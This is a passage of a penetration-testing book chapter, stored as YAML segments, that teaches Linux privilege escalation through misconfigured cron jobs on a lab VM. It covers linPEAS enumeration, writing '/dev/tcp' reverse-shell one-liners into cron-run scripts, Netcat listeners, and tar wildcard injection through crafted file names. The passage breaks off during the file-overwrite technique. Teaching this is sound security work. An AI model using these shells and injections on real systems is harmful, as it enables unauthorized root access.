@@ -1,0 +1,1015 @@
+- en: '*Chapter 12*: Scheduled Tasks'
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: One of the most important privilege escalation vectors on Linux is exploiting
+    misconfigured scheduled tasks, also known as **cron jobs**. This chapter will
+    focus on the process of enumerating the scheduled tasks running on the target
+    system, analyzing them for misconfigurations, and exploiting them to elevate our
+    privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We will start this chapter by looking at how Linux implements scheduled tasks
+    with cron, after which we will take a look at how to escalate our privileges through
+    cron paths. We will then take a look at how to exploit cron wildcards to elevate
+    our privileges, before exploring the process of escalating our privileges via
+    cron file overwrites.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In this chapter, we''re going to cover the following main topics:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Introduction to cron jobs
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Escalation via cron paths
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Escalation via cron wildcards
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Escalation via cron file overwrites
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Technical requirements
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: To follow along with the demonstrations in this chapter, you will need to ensure
+    that you have familiarity with Linux Terminal commands.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'You can view this chapter''s code in action here: [https://bit.ly/3F3747S](https://bit.ly/3F3747S)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Introduction to cron jobs
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: The ability to schedule tasks on an operating system is a vitally important
+    feature that can improve the efficiency of the tasks being performed on the system
+    and, consequently, the efficiency of the individuals responsible for managing
+    and maintaining the system. This functionality may not be fully realized or appreciated
+    in desktop operating systems that are typically geared toward regular end users,
+    but in the case of Linux, where it is mostly deployed as a server operating system,
+    the ability to automate and schedule certain repetitive tasks such as system backups
+    is greatly appreciated and is widely implemented by system administrators and
+    engineers.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Linux implements task scheduling through a utility called **cron**. Cron is
+    a time-based service that runs applications, scripts, and other commands repeatedly
+    on a specified schedule.
+  prefs: []
+  type: TYPE_NORMAL
+- en: An application or script that has been configured to be run repeatedly with
+    cron is known as a cron job. Cron can be used to automate or repeat a wide variety
+    of functions on a system, from daily backups to system upgrades and patches.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Cron allows you to run a program, script, or command periodically at whatever
+    time you choose. These cron jobs are then stored in the **crontab** file.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The **crontab** file is a configuration file that is used by the cron utility
+    to store and track cron jobs that have been created.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that you have an understanding of what cron is and what it does, let's take
+    a look at how cron jobs are stored in the **crontab** file.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The crontab file
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'You can list the cron jobs running on a system by running the following command
+    on the target system:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: crontab
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Alternatively, if the user you are currently logged in as doesn''t have the
+    necessary permissions to utilize the **crontab** command, you can also manually
+    display the contents of the **crontab** file by running the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: cat /etc/crontab
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'As shown in the following screenshot, this will output a list of all active
+    cron jobs, as well as their respective schedules, applications, scripts, or commands
+    they have been configured to run:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.1 – Contents of the crontab file'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_001.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 12.1 – Contents of the crontab file
+  prefs: []
+  type: TYPE_NORMAL
+- en: To understand how we can exploit cron jobs to elevate our privileges, we need
+    to have an understanding of how the **crontab** file is structured and how the
+    schedules for the cron jobs are configured.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This can be achieved through a simple example. The **crontab** entry highlighted
+    in the following screenshot schedules the command to be run at the 17th minute
+    of every hour, repeatedly:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.2 – Example of a cron job'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_002.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 12.2 – Example of a cron job
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The first five fields at the beginning of the cron job entry are used to specify
+    the scheduled time. These fields are used to specify the following values:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Minute (0 – 59)**: Used to specify the minute the cron job should be run.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Hour (0 – 23)**: Used to specify the hour of the day the cron job should
+    be run.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Day of the month (1 – 31)**: Used to specify the specific day of the month
+    the cron job should be run.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Month (1 – 12)**: Used to specify the month when the cron job should be run.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Day of the week (0 – 7)**: Used to specify the day of the week when the cron
+    job should be run.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'As you may have noticed, some fields have an asterisk (*****) as a value, which
+    means that the cron job will run on all of the hours, days, weeks, and months
+    unless specified otherwise. In this case, the cron job will run at the 17th minute
+    of every hour, day, month, and day of the week:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.3 – Cron job syntax'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_003.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 12.3 – Cron job syntax
+  prefs: []
+  type: TYPE_NORMAL
+- en: The preceding screenshot outlines the syntax of a cron job and the various fields
+    that can be customized to configure the schedule for the cron job.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Cron jobs can also be run as any user on the system. This is a very important
+    factor to keep an eye on as we will be targeting cron jobs that have been configured
+    to be run as the root user. This is primarily because any script or command that
+    is run by a cron job will run as the root user and, consequently, provide us with
+    root access.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that you have an understanding of how cron jobs work and how they are configured,
+    we can begin the process of analyzing them for misconfigurations to elevate our
+    privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this chapter, we will be utilizing the virtual machine we set up in [*Chapter
+    11*](B17389_11_Final_PG_ePub.xhtml#_idTextAnchor152), *Linux Password Mining*.
+    This is because the virtual machine has been configured to be vulnerable and has
+    various cron jobs that can be used to demonstrate various privilege escalation
+    techniques.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Escalation via cron paths
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: The first privilege escalation technique we will be exploring is the process
+    of exploiting poorly configured cron paths. However, before we can begin this
+    process, let's take a quick look at the various ways of accessing the **crontab**
+    file on the target system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The reason we need to do this is because we will come across systems that have
+    been configured differently and can access the **crontab** file, so enumerating
+    cron jobs running on a system is vitally important in the privilege escalation
+    process.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'As demonstrated in the previous section, you can access the **crontab** file
+    on the target system by running the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: crontab
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This command may not yield any results if access to the utility has been limited
+    by the administrator. However, you can use the following commands to enumerate
+    information regarding the active cron jobs on the system:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: crontab -l
+  prefs: []
+  type: TYPE_NORMAL
+- en: ls -alh /var/spool/cron;
+  prefs: []
+  type: TYPE_NORMAL
+- en: ls -al /etc/ | grep cron
+  prefs: []
+  type: TYPE_NORMAL
+- en: ls -al /etc/cron*
+  prefs: []
+  type: TYPE_NORMAL
+- en: cat /etc/cron*
+  prefs: []
+  type: TYPE_NORMAL
+- en: cat /etc/at.allow
+  prefs: []
+  type: TYPE_NORMAL
+- en: cat /etc/at.deny
+  prefs: []
+  type: TYPE_NORMAL
+- en: cat /etc/cron.allow
+  prefs: []
+  type: TYPE_NORMAL
+- en: cat /etc/cron.deny*
+  prefs: []
+  type: TYPE_NORMAL
+- en: Accessing the files and directories listed here should yield information regarding
+    the active cron jobs on the system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Enumeration with linPEAS
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: We can also enumerate the various cron jobs running on a system with automated
+    tools. This can be done by using **linux-exploit-suggester** or other enumeration
+    scripts and tools. In this case, we will utilize the **linPEAS** script to enumerate
+    information from our target.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Note
+  prefs: []
+  type: TYPE_NORMAL
+- en: linPEAS is a local Linux enumeration script that searches and scans for potential
+    vulnerabilities, and also enumerates all important system information that can
+    be used to stage a privilege escalation attack.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The linPEAS binary can be downloaded from the following GitHub repository:
+    [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Ensure you download the **linpeas.sh** Bash script, as highlighted in the following
+    screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.4 – linPEAS Bash script'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_004.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 12.4 – linPEAS Bash script
+  prefs: []
+  type: TYPE_NORMAL
+- en: After downloading the Bash script to our Kali VM, we need to transfer the **linpeas.sh**
+    file to our target virtual machine. This cannot be done automatically as we do
+    not have a Meterpreter session. As a result, we will need to make use of Linux-specific
+    utilities to download the binary.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Transferring files
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'To transfer the **linpeas.sh** file to our target, we will need to set up a
+    web server on our Kali VM that will be used to host the file. This will allow
+    us to download it on the target system. This can be done by following these steps:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To set up a web server on our Kali VM, we can utilize the **SimpleHTTPServer**
+    Python module to serve the binary file. This can be done by running the following
+    command in the directory where the **linpeas.sh** binary is stored:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**sudo python -m SimpleHTTPServer 80**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Note
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**SimpleHTTPServer** is a Python module for Python 2 that is also available
+    for Python 3 as **http.server**.'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As highlighted in the following screenshot, the **SimpleHTTPServer** module
+    will serve the files in the directory on the Kali VM IP address on port **80**:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 12.5 – SimpleHTTPServer linpeas'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_005.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 12.5 – SimpleHTTPServer linpeas
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: To download the **linpeas.sh** file on the target system, we can utilize the
+    **wget** utility. Before we can download the binary, however, we need to navigate
+    to a directory where we have read and write permissions. In this case, we will
+    navigate to the temporary directory, as illustrated in the following screenshot:![Figure
+    12.6 – Linux temporary directory
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_006.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 12.6 – Linux temporary directory
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now use the **wget** utility to download the file from the Kali VM to
+    our target system. This can be done by running the following command on the target
+    system:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**wget http://<KALI-VM-IP>/linpeas.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The output is shown in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 12.7 – wget linPEAS'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_007.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 12.7 – wget linPEAS
+  prefs: []
+  type: TYPE_NORMAL
+- en: As shown in the preceding screenshot, if the transfer is successful, the **linpeas.sh**
+    file should be downloaded and saved with the name we specified.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We can now use the **linpeas.sh** script to enumerate the various cron jobs
+    running on the target system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Finding cron jobs with linPEAS
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'The **linpeas.sh** script enumerates a lot of information and will perform
+    various checks to discover potential vulnerabilities on the target system. We
+    can use the **linpeas.sh** script to enumerate and locate the cron jobs running
+    on the system. This can be done by following these steps:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To enumerate all the important system information, we need to run the **linpeas.sh**
+    script. However, before we do that, we need to ensure the script has executable
+    permissions. This can be done by running the following command in the target:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**chmod +x linpeas.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Alternatively, you can modify the permissions of the **linpeas.sh** script
+    by running the following command:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**chmod 775 linpeas.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now run the **linpeas.sh** script by running the following command on
+    the target:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**bash linpeas.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'As shown in the following screenshot, the script will enumerate system information
+    and display a list of cron jobs running on the system, as well as the default
+    **$PATH** variable:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 12.8 – linPEAS cron jobs'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_008.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 12.8 – linPEAS cron jobs
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this case, our target is running two cron jobs as the **root** user that
+    have been configured to run every 1 minute. We can use this information to identify
+    specific misconfigurations in the scripts and commands that are executed by the
+    cron jobs.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that we have been able to enumerate the various cron jobs running on the
+    target system, we can begin the privilege escalation process.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Escalating privileges via cron paths
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'This particular privilege escalation technique involves identifying the default
+    **$PATH** variable that''s been configured for cron jobs in the **crontab** file,
+    generating a payload, and placing it in the path:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.9 – The PATH variable'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_009.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 12.9 – The PATH variable
+  prefs: []
+  type: TYPE_NORMAL
+- en: Note
+  prefs: []
+  type: TYPE_NORMAL
+- en: The **$PATH** variable is used to set the default path that the cron jobs will
+    run from, unless specified otherwise.
+  prefs: []
+  type: TYPE_NORMAL
+- en: As highlighted in the preceding screenshot, the **$PATH** variable has been
+    set as the home directory of the **user** account. This means that, by default,
+    all the cron jobs will run from the **user** account's home directory, unless
+    specified otherwise.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This can be construed as a misconfiguration as the **user** account can access
+    files and scripts that are used by the cron jobs. We can exploit this misconfiguration
+    by identifying cron jobs that utilize scripts or binaries that are stored in the
+    **user** account's home directory.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Analyzing the **crontab** file reveals an interesting cron job that runs a
+    Bash script named **overwrite.sh** as the **root** user:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 12.10 – Overwrite cron job'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_010.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 12.10 – Overwrite cron job
+  prefs: []
+  type: TYPE_NORMAL
+- en: As highlighted in the preceding screenshot, the cron job has also been configured
+    to run every 1 minute of every hour, every day, and every month.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Now that we have identified a potential cron job that has the necessary requirements,
+    we can begin the privilege escalation process:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The first step in this process involves locating and identifying the location
+    of the **overwrite.sh** script that is run by the cron job. We were able to determine
+    the default path used by the cron job is the **user** account''s home directory.
+    We can display the contents of the directory by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**ls -al /home/user/**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The output is as follows:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 12.11 – The user home directory'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_011.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 12.11 – The user home directory
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: As illustrated in the preceding screenshot, we are unable to locate the **overwrite.sh**
+    script in the **user** home directory. This could be because the **root** user
+    has not created the script yet. In any event, we can create the script ourselves
+    and get it to provide us with a reverse shell with root privileges as the cron
+    job will execute the script as the root user.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can create the **overwrite.sh** script and insert a Bash command that will
+    provide us with a reverse shell. This can be done by running the following command
+    in the **user** home directory:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" > overwrite.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: This command will add a **bash** command that will connect to our reverse listener
+    on the Kali Linux VM. Ensure that you replace the fields in the command with the
+    respective IP address and port number.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After running the preceding command, the **overwrite.sh** file should have
+    been created, and it should contain the command outlined in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 12.12 – Overwrite file'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_012.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 12.12 – Overwrite file
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Once we have created this file, we need to set up a reverse listener with Netcat.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can set up the reverse listener on the Kali VM by running the following
+    command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**nc -nvlp <PORT>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Ensure that you specify the port that you used in the **overwrite.sh** script.
+    After setting up the listener, we will need to wait for a few minutes for the
+    cron job to run.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Once the cron job has been invoked, the **overwrite.sh** script will be executed.
+    We should get a reverse shell on our listener with root privileges, as highlighted
+    in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 12.13 – Reverse shell'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_013.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 12.13 – Reverse shell
+  prefs: []
+  type: TYPE_NORMAL
+- en: With that, we have successfully elevated our privileges by leveraging a misconfiguration
+    in the crontab **$PATH** variable. This allowed us to execute a custom command
+    that provided us with an elevated reverse shell on the target system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Escalation via cron wildcards
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: This privilege escalation technique involves taking advantage of cron jobs that
+    execute commands or scripts with wildcards. In the context of Linux, wildcards
+    (*****) are used to perform more than one action at a time, and they can be used
+    in a variety of different ways. In this section, we will explore how they can
+    be exploited to execute malicious commands or scripts if misconfigured.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Important Note
+  prefs: []
+  type: TYPE_NORMAL
+- en: Note that the success of this technique will depend on whether or not wildcards
+    have been utilized in cron jobs.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Follow these steps:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: The first step in this process involves identifying cron jobs that run commands
+    or scripts with wildcards. Analyzing the **crontab** file reveals an interesting
+    cron job that is responsible for creating and compressing backup archives:![Figure
+    12.14 – Backup cron job
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_014.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 12.14 – Backup cron job
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: As highlighted in the preceding screenshot, the cron job runs the **compress.sh**
+    script located under **/usr/local/bin** as the root user and runs every minute
+    of every hour, every day, and every month.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can display the content of the **compress.sh** script by running the following
+    command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**cat /usr/local/bin/compress.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The output is as follows:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 12.15 – Displaying the content of the compress.sh script'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_015.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 12.15 – Displaying the content of the compress.sh script
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: As highlighted in the preceding screenshot, we can identify that the script
+    is executed from the **user** account's home directory and that the files have
+    been compressed with the **tar** utility. However, we can also identify a wildcard
+    (*****) at the end of the **tar** command. The wildcard is used to specify all
+    the files in the **user** account's home directory.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: The **tar** utility has a checkpoint feature that is used to display progress
+    messages after a specific set of files. It also allows users to define a specific
+    action that is executed during the checkpoint. We can leverage this feature to
+    execute a reverse shell payload that will provide us with an elevated session
+    when executed.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'We can create the reverse shell script and insert a **bash** command that will
+    provide us with a reverse shell. This can be done by running the following command
+    in the **user** home directory:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**echo ''bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1'' > shell.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: This command will add a **bash** command that will connect to our reverse listener
+    on the Kali Linux VM. Ensure that you replace the fields in the command with the
+    respective IP address and port number.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After running the preceding command, the **shell.sh** file should have been
+    created, and it should contain the command outlined in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 12.16 – Shell script'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_016.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 12.16 – Shell script
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Now that we have created the file, we need to set up a reverse listener with
+    Netcat.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can set up the reverse listener on the Kali VM by running the following
+    command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**nc -nvlp <PORT>**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Ensure that you specify the port that you used in the **shell.sh** script.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We can now set up our **tar** checkpoints in the **user** account''s home directory.
+    This can be done by running the following command on the target system:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**touch /home/user/--checkpoint=1**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After setting up our checkpoint, we need to set up our checkpoint action. In
+    this case, our checkpoint action will execute the **shell.sh** script, which will
+    provide us with an elevated reverse shell. This can be done by running the following
+    command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**touch /home/user/--checkpoint-action=exec=sh\ shell.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'After setting up the **tar** checkpoint and checkpoint action, we need to wait
+    a few minutes for the cron job to be invoked, after which we should receive an
+    elevated reverse shell on our Netcat listener, as highlighted in the following
+    screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 12.17 – Reverse shell'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_017.jpg)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Figure 12.17 – Reverse shell
+  prefs: []
+  type: TYPE_NORMAL
+- en: With that, we have successfully elevated our privileges by exploiting cron jobs
+    that implement the improper use of wildcards to execute a reverse shell payload
+    as the root user.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now, let's take a look at how to elevate our privileges through cron file overwrites.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Escalation via cron file overwrites
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Another technique we can leverage to elevate our privileges is the ability to
+    overwrite the content of scripts that are used by cron jobs. In the previous sections,
+    we explored the process of leveraging misconfigured paths and utilizing wildcards.
+    However, we did not explore the process of overwriting the content of scripts
+    or files to elevate our privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Note
+  prefs: []
+  type: TYPE_NORMAL
+- en: The success and viability of this technique will depend on whether we have the
+    necessary permissions to write or make changes to the script or file being run
+    by the cron job.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'This technique can be performed by following these steps:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: The first step in this process involves identifying a cron job that executes
+    a script or binary with read and write permissions as the root user. In this case,
+    we can identify a cron job that runs the **overwrite.sh** script when invoked,
+    as highlighted in the following screenshot:![Figure 12.18 – Overwrite cron job](Images/B17389_12_018.jpg)
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Figure 12.18 – Overwrite cron job
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'We looked at how to exploit this particular cron job in section two of this
+    chapter, *Escalation via cron paths*, where we exploited a misconfigured path
+    that allowed us to create a custom **overwrite.sh** script that provided us with
+    an elevated reverse shell when executed. This was because the default path variable
+    specified the **user** account''s home directory as the primary directory for
+    the cron job. However, if the **overwrite.sh** script is not found in the first
+    directory, cron will check the other directories specified in the **$PATH** variable,
+    as highlighted in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 12.19 – Crontab paths'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_019.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 12.19 – Crontab paths
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'In this case, we do not find the **overwrite.sh** script in the **user** account''s
+    home directory. As a result, we can search for the script in the other directories
+    specified in the **$PATH** variable. This can be done by listing the contents
+    of each directory, as follows:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**ls -al /usr/local/bin | grep overwrite.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'Alternatively, you can use the **locate** utility to search for the **overwrite.sh**
+    script by running the following command:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '**locate overwrite.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'In this case, we will find the file under the **/usr/local/bin** directory,
+    as highlighted in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 12.20 – Locating the script'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_020.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 12.20 – Locating the script
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The next step involves identifying the permissions of the **overwrite.sh**
+    to determine whether we can make changes or overwrite the content of the script.
+    This can be done by running the following command:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '**ls -al /usr/local/bin | grep overwrite.sh**'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: 'The output is shown in the following screenshot:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '![Figure 12.21 – File permissions'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '](Images/B17389_12_021.jpg)'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Figure 12.21 – File permissions
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: In this case, we can determine that the script has read and write permissions.
+    As a result, we can make changes or overwrite the file with our own commands.
